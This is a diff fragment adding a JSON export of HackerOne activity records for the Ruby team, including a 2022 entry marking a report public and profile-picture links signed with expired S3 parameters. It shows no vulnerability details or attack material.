+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070442Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c95d422d3d54e3227f6d5610d39204e44f688219b2618cd76595da5a144e1467"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 15326582,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-02-04T06:31:47.630Z",
+            "updated_at": "2022-02-04T06:31:47.630Z",
+            "actor": {
+                "username": "hsbt",
+                "cleared": false,
+                "verified": false,
+                "url": "/hsbt",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070442Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c95d422d3d54e3227f6d5610d39204e44f688219b2618cd76595da5a144e1467"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
